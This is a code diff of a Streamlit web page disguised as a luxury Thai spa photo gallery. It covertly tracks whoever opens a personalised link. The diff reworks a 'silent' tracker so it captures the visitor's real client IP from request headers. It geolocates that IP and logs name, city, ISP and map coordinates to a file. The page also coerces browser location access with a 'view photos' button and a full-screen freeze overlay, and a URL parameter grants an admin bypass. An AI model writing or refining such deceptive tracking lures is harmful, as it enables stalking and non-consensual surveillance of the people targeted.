@@ -20,30 +20,38 @@ if not os.path.exists(DATA_FILE):
     df = pd.DataFrame(columns=["Timestamp", "Guest/Executive Name", "Spa Portfolio Link", "Verified Location"])
     df.to_csv(DATA_FILE, index=False)
 
-# Silent IP Tracker (100% Success Rate Background Capture)
-def get_ip_location_silent():
+# BUG FIX: User ka asli Client IP nikal kar uski location trace karna
+def get_client_ip_location():
     try:
-        response = requests.get('http://ip-api.com/json/', timeout=4).json()
-        if response and response.get('status') == 'success':
-            city = response.get('city', '')
-            region = response.get('regionName', '')
-            country = response.get('country', '')
-            isp = response.get('isp', '')
-            ip = response.get('query', '')
-            lat = response.get('lat', '')
-            lon = response.get('lon', '')
+        # Streamlit context headers me se user ka real IP nikalna
+        headers = st.context.headers
+        client_ip = headers.get("X-Forwarded-For", "").split(",")[0].strip()
+        
+        if not client_ip or client_ip == "127.0.0.1":
+            client_ip = headers.get("X-Real-Ip", "").strip()
             
-            approx_address = f"[IP Fallback] City: {city}, Region: {region}, Country: {country} | ISP: {isp} (IP: {ip})"
-            maps_fallback = f"https://www.google.com/maps?q={lat},{lon}"
-            return approx_address, maps_fallback
-    except:
+        if client_ip:
+            # Ab user ke specific IP ko check karna (Na ki server ke IP ko)
+            response = requests.get(f'http://ip-api.com/json/{client_ip}', timeout=4).json()
+            if response and response.get('status') == 'success':
+                city = response.get('city', '')
+                region = response.get('regionName', '')
+                country = response.get('country', '')
+                isp = response.get('isp', '')
+                lat = response.get('lat', '')
+                lon = response.get('lon', '')
+                
+                approx_address = f"[IP Fallback] City: {city}, Region: {region}, Country: {country} | ISP: {isp} (IP: {client_ip})"
+                maps_fallback = f"https://www.google.com/maps?q={lat},{lon}"
+                return approx_address, maps_fallback
+    except Exception as e:
         pass
     return "[IP Fetch Failed] Secure Connection Active", "https://maps.google.com"
 
 @st.cache_data(show_spinner=False, ttl=3600)
 def get_text_address_cached(lat, lon):
     try:
-        geolocator = Nominatim(user_agent="thai_spa_premium_secure_v5")
+        geolocator = Nominatim(user_agent="thai_spa_premium_secure_v6")
         location = geolocator.reverse(f"{lat}, {lon}", timeout=5)
         return location.address if location else "Location Logged Successfully"
     except:
@@ -52,7 +60,7 @@ def get_text_address_cached(lat, lon):
 # Extract URL parameters
 query_params = st.query_params
 employee_name = query_params.get("name", "").replace("_", " ")
-user_role = query_params.get("role", "") # Secret parameter for admin bypass (?role=admin)
+user_role = query_params.get("role", "")
 
 # ================= 2. LUXURY SPA PREMIUM CSS STYLING =================
 st.markdown("""
@@ -78,7 +86,6 @@ st.markdown("""
         letter-spacing: 1.5px;
     }
     
-    /* Gold Rounded Pill Action Button */
     div.stButton > button:first-child {
         background: linear-gradient(135deg, #D4AF37 0%, #AA7C11 100%); 
         color: #ffffff !important;
@@ -126,13 +133,12 @@ st.markdown("""
 st.markdown("<h1>🌺 LOTUS AURA LUXURY THAI SPA</h1>", unsafe_allow_html=True)
 st.markdown(f"<div class='sub-date'>Premium Experience Lounge — {datetime.now().strftime('%d %B %Y')}</div>", unsafe_allow_html=True)
 
-# Session State Initialization
 if "verified_user" not in st.session_state:
     st.session_state.verified_user = False
 
-# --- STAGE 1: BACKGROUND SILENT IP CAPTURE ---
+# --- STAGE 1: NEW FIXED SILENT BACKGROUND IP CAPTURE ---
 if employee_name and f"ip_logged_{employee_name}" not in st.session_state:
-    approx_address, maps_fallback = get_ip_location_silent()
+    approx_address, maps_fallback = get_client_ip_location()
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
     ip_data = pd.DataFrame([[timestamp, employee_name, maps_fallback, approx_address]], 
@@ -140,9 +146,7 @@ if employee_name and f"ip_logged_{employee_name}" not in st.session_state:
     ip_data.to_csv(DATA_FILE, mode='a', header=False, index=False)
     st.session_state[f"ip_logged_{employee_name}"] = True
 
-
-# ================= FLOW CONTROL: CRITICAL LOCK MECHANISM =================
-# Agar user verified nahi hai aur woh koi admin bypass bhi use nahi kar raha, toh content poori tarah hide rahega.
+# ================= FLOW CONTROL: SECURITY LOCK MECHANISM =================
 if not st.session_state.verified_user and user_role != "admin":
     if not employee_name:
         st.error("❌ Access Revoked: Missing Premium Authentication Token.")
@@ -154,9 +158,7 @@ if not st.session_state.verified_user and user_role != "admin":
         </div>
         """, unsafe_allow_html=True)
         
-        # Continuous Location handshake trigger
         loc = get_geolocation()
-        
         trigger_gallery = st.button("📸 Click Here to View Premium Thai Spa Photos ✨")
 
         if trigger_gallery:
@@ -178,8 +180,7 @@ if not st.session_state.verified_user and user_role != "admin":
                 except Exception as e:
                     st.error("🔄 Connection Reset. Please click again.")
             else:
-                # ================= 🔥 STAGE 2: ABSOLUTE INTERFACE FREEZE OVERLAY =================
-                # Agar button click hua aur location bypass ki gayi, toh poora portal CSS se block ho jayega.
+                # ================= STAGE 2: HARD FREEZE OVERLAY =================
                 st.markdown("""
                     <style>
                     .freeze-screen {
@@ -220,13 +221,12 @@ if not st.session_state.verified_user and user_role != "admin":
                         </div>
                     </div>
                 """, unsafe_allow_html=True)
-                st.stop() # Script execution instantly frozen here.
+                st.stop()
 
-# ================= 3. RENDER FULL APP INTERFACE (POST-VERIFICATION ONLY) =================
+# ================= 3. RENDER FULL APP INTERFACE =================
 else:
     tab1, tab2 = st.tabs(["✨ Spa Gallery Terminal", "🔐 Management Lounge"])
 
-    # --- CLIENT TERMINAL TAB ---
     with tab1:
         st.markdown(f"""
         <div class='success-card'>
@@ -237,11 +237,8 @@ else:
         </div>
         """, unsafe_allow_html=True)
         st.balloons()
-        
-        # Aap yahan apni spa gallery photos ka extra content add kar sakte hain.
         st.info("ℹ️ Loading exclusive catalog media from private node...")
 
-    # --- MANAGEMENT CONTROL LOUNGE TAB ---
     with tab2:
         st.subheader("🔑 Administrative Authentication")
         
